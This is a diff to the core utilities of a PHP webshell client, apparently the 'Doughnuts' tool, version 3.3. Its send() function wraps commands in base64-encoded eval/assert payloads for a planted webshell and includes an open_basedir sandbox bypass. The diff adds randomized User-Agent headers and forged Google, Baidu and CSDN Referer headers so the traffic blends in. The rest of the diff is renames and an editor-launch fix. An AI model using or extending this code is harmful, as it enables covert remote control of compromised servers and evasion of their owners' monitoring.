@@ -2,9 +2,10 @@ from subprocess import check_output, Popen
 from base64 import b64decode, b64encode
 from platform import system
 from pprint import pprint
-from random import randint, sample
+from random import randint, sample, choice
 from types import MethodType
 from urllib.parse import quote
+from string import ascii_letters, digits
 from uuid import uuid4
 from locale import getpreferredencoding
 
@@ -16,11 +17,12 @@ from urllib3 import disable_warnings
 from libs.config import color, gget, gset
 from libs.debug import DEBUG
 
-level = []
-connect_pipe_map = {True: "│  ", False: "   "}
+LEVEL = []
+CONNECT_PIPE_MAP = {True: "│  ", False: "   "}
 SYSTEM_TEMPLATE = None
 Session = requests.Session()
-local_encoding = getpreferredencoding()
+LOCAL_ENCODING = getpreferredencoding()
+ALPATHNUMERIC = ascii_letters + digits
 
 
 disable_warnings()
@@ -57,26 +59,27 @@ def banner():
     if logo_choose == 3:
         print(
             r"""
-'########:::'#######::'##::::'##::'######:::'##::::'##:'##::: ##:'##::::'##:'########::'######::
- # .... ##:'##.... ##: ##:::: ##:'##... ##:: ##:::: ##: ###:: ##: ##:::: ##:... ##..::'##... ##:
- # :::: ##: ##:::: ##: ##:::: ##: ##:::..::: ##:::: ##: ####: ##: ##:::: ##:::: ##:::: ##:::..::
- # :::: ##: ##:::: ##: ##:::: ##: ##::'####: #########: ## ## ##: ##:::: ##:::: ##::::. ######::
- # :::: ##: ##:::: ##: ##:::: ##: ##::: ##:: ##.... ##: ##. ####: ##:::: ##:::: ##:::::..... ##:
- # :::: ##: ##:::: ##: ##:::: ##: ##::: ##:: ##:::: ##: ##:. ###: ##:::: ##:::: ##::::'##::: ##:
- # ::. #######::. #######::. ######::: ##:::: ##: ##::. ##:. #######::::: ##::::. ######::
-........::::.......::::.......::::......::::..:::::..::..::::..:::.......::::::..::::::......:::
+
+ ________  ________  ___  ___  ________  ___  ___  ________   ___  ___  _________  ________
+|\   ___ \|\   __  \|\  \|\  \|\   ____\|\  \|\  \|\   ___  \|\  \|\  \|\___   ___\\   ____\
+\ \  \_|\ \ \  \|\  \ \  \\\  \ \  \___|\ \  \\\  \ \  \\ \  \ \  \\\  \|___ \  \_\ \  \___|_
+ \ \  \ \\ \ \  \\\  \ \  \\\  \ \  \  __\ \   __  \ \  \\ \  \ \  \\\  \   \ \  \ \ \_____  \
+  \ \  \_\\ \ \  \\\  \ \  \\\  \ \  \|\  \ \  \ \  \ \  \\ \  \ \  \\\  \   \ \  \ \|____|\  \
+   \ \_______\ \_______\ \_______\ \_______\ \__\ \__\ \__\\ \__\ \_______\   \ \__\  ____\_\  \
+    \|_______|\|_______|\|_______|\|_______|\|__|\|__|\|__| \|__|\|_______|    \|__| |\_________\
+                                                                                     \|_________|
 
 """
         )
-    print(color.green("Doughnut Version: 3.2\n"))
+    print(color.green("Doughnut Version: 3.3\n"))
 
 
-def base64_encode(data: str):
-    return b64encode(data.encode()).decode()
+def base64_encode(data: str, encoding="utf-8"):
+    return b64encode(data.encode(encoding=encoding)).decode()
 
 
-def base64_decode(data: str):
-    return b64decode(data.encode()).decode()
+def base64_decode(data: str, encoding="utf-8"):
+    return b64decode(data.encode()).decode(encoding=encoding)
 
 
 def clean_trace():
@@ -114,11 +117,44 @@ def r_json(self, **kwargs):
     return complexjson.loads(self.r_text, **kwargs)
 
 
+def randstr(string="", offset=8):
+    return ''.join(sample(string, offset))
+
+
+def trush(min_num=2, max_num=4):
+    return randstr(ALPATHNUMERIC, randint(min_num, max_num))
+
+
+def fake_ua():
+    user_agents = gget("user_agents", default=(
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",))
+    return choice(user_agents).strip()
+
+
+def fake_referer():
+    i = randint(1, 6)
+    random_params = ""
+    for _ in range(randint(4, 8)):
+        random_params += f"{trush()}={trush()}&"
+    random_params = random_params.strip("&")
+    if (i == 1):
+        return f"https://www.google.{trush(2,2)}/url?{random_params}"
+    elif (i == 2):
+        return f"https://blog.csdn.net/{trush(5, 12)}/article/details/{randint(10000, 99999)}?{random_params}"
+    elif (i == 3):
+        return f"https://www.baidu.com/?q={trush(2,10)}&{random_params}"
+    elif (i == 4):
+        return f"https://www.google.com/?q={trush(2,10)}&{random_params}"
+    elif (i == 5):
+        return f"https://juejin.im/post/{randstr(ALPATHNUMERIC, 24)}?{random_params}"
+    elif (i == 6):
+        return f"https://juejin.im/post/{randstr(ALPATHNUMERIC, 24)}?{random_params}"
+
+
 def send(data: str, raw: bool = False, **extra_params):
     offset = 8
+    encode_recv = False
 
-    def randstr(offset):
-        return ''.join(sample("!@#$%^&*()[];,.?", offset))
     url = gget("webshell.url", "webshell")
     params_dict = gget("webshell.params_dict", "webshell").copy()
     php_v7 = gget("webshell.v7", "webshell")
@@ -129,12 +165,17 @@ def send(data: str, raw: bool = False, **extra_params):
     params_dict.update(extra_params)
     if "data" not in params_dict:
         params_dict["data"] = {}
-    head = randstr(offset)
-    tail = randstr(offset)
+    head = randstr("!@#$%^&*()[];,.?", offset)
+    tail = randstr("!@#$%^&*()[];,.?", offset)
     pwd_b64 = b64encode(
         gget("webshell.pwd", "webshell", "Lg==").encode()).decode()
     if not raw:
-        data = f"""error_reporting(0);chdir(base64_decode("{pwd_b64}"));print("{head}");""" + data
+        encode_head = "ob_start();" if encode_recv else ""
+        encode_tail = """$ooDoo=ob_get_clean();
+$encode = mb_detect_encoding($ooDoo, array("ASCII",'UTF-8',"GB2312","GBK",'BIG5','ISO-8859-1','latin1'));
+$ooDoo = mb_convert_encoding($ooDoo, 'UTF-8', $encode);
+print(base64_encode($ooDoo));""" if encode_recv else ""
+        data = f"""error_reporting(0);{encode_head}chdir(base64_decode("{pwd_b64}"));print("{head}");""" + data
         if (gget("webshell.bypass_obd", "webshell")):
             data = """$dir=pos(glob("./*", GLOB_ONLYDIR));
 $cwd=getcwd();
@@ -148,7 +189,7 @@ $c=substr_count(getcwd(), "/");
 for($i=0;$i<$c;$i++) chdir("..");
 ini_set("open_basedir", "/");
 chdir($cwd);rmdir($ndir);""" % (uuid4()) + data
-        data += f"""print("{tail}");"""
+        data += f"""print("{tail}");{encode_tail}"""
         data = f"""eval(base64_decode("{base64_encode(data)}"));"""
         if (not php_v7):
             data = f"""assert(eval(base64_decode("{base64_encode(data)}")));"""
@@ -160,6 +201,8 @@ chdir($cwd);rmdir($ndir);""" % (uuid4()) + data
             data = encode_pf["doughnuts"].run(data, salt)
     if (raw_key == "cookies"):
         data = quote(data)
+    params_dict['headers']['User-agent'] = fake_ua()
+    params_dict['headers']['Referer'] = fake_referer()
     params_dict[raw_key][password] = data
     try:
         req = Session.post(url, verify=False, **params_dict)
@@ -170,8 +213,12 @@ chdir($cwd);rmdir($ndir);""" % (uuid4()) + data
         req.encoding = encoding = req.apparent_encoding
     else:
         encoding = "utf-8"
-    text = req.text
-    content = req.content
+    if (raw or not encode_recv):
+        text = req.text
+        content = req.content
+    else:
+        text = base64_decode(req.text)
+        content = b64decode(req.content)
     text_head_offset = text.find(head)
     text_tail_offset = text.find(tail)
     text_head_offset = text_head_offset + \
@@ -991,7 +1038,7 @@ def has_env(env: str, remote: bool = True):
             flag = gget("webshell.has_%s" % env, "webshell")
     else:
         if (not gget("has_%s" % env)):
-            flag = check_output([command, env]).strip().decode(local_encoding)
+            flag = check_output([command, env]).strip().decode(LOCAL_ENCODING)
             gset("has_%s" % env, flag)
         else:
             flag = gget("has_%s" % env)
@@ -999,14 +1046,18 @@ def has_env(env: str, remote: bool = True):
 
 
 def open_editor(file_path: str, editor: str = ""):
-    editor = editor if editor else ("notepad.exe" if has_env("notepad.exe") else "vi")
-    if (has_env(editor, False)):
-        path = gget(f"has_{editor}")
+    if (editor):
+        if (has_env(editor, False)):
+            binpath = gget(f"has_{editor}")
+            if ("\n" in binpath):
+                binpath = binpath.split("\n")[0]
+        else:
+            print(color.red(f"{editor} not found in local environment"))
+            return False
     else:
-        print(color.red(f"{editor} not found in local environment"))
-        return False
+        binpath = "notepad.exe" if has_env("notepad.exe", False) else "vi"
     try:
-        p = Popen([path, file_path], shell=False)
+        p = Popen([binpath, file_path], shell=False)
         p.wait()
         return True
     except FileNotFoundError:
@@ -1016,7 +1067,7 @@ def open_editor(file_path: str, editor: str = ""):
 def _print_tree(tree_or_node, depth=0, is_file=False, end=False):
     if (is_file):
         pipe = "└─" if (end) else "├─"
-        connect_pipe = "".join([connect_pipe_map[_] for _ in level[:depth-1]])
+        connect_pipe = "".join([CONNECT_PIPE_MAP[_] for _ in LEVEL[:depth-1]])
         try:
             tree_or_node = b64decode(tree_or_node.encode()).decode('gbk')
         except Exception:
@@ -1033,7 +1084,7 @@ def _print_tree(tree_or_node, depth=0, is_file=False, end=False):
             _print_tree(v, depth+1, is_file=True, end=end)  # 输出目录
     elif (isinstance(tree_or_node, dict)):
         index = 0
-        level.append(True)
+        LEVEL.append(True)
         for k, v in tree_or_node.items():
             index += 1
             if (index == len(tree_or_node)):
@@ -1041,15 +1092,15 @@ def _print_tree(tree_or_node, depth=0, is_file=False, end=False):
             if (isinstance(v, (list, dict))):  # 树中树
                 _print_tree(k, depth+1, is_file=True, end=end)  # 输出目录
                 if (end):
-                    level[depth] = False
+                    LEVEL[depth] = False
                 _print_tree(v, depth+1)  # 递归输出树x
             elif (isinstance(v, str)) or v is None:  # 节点
                 _print_tree(v, depth+1, is_file=True, end=end)  # 输出文件
 
 
 def print_tree(name, tree):
-    global level
-    level = []
+    global LEVEL
+    LEVEL = []
     print(name)
     _print_tree(tree)
 
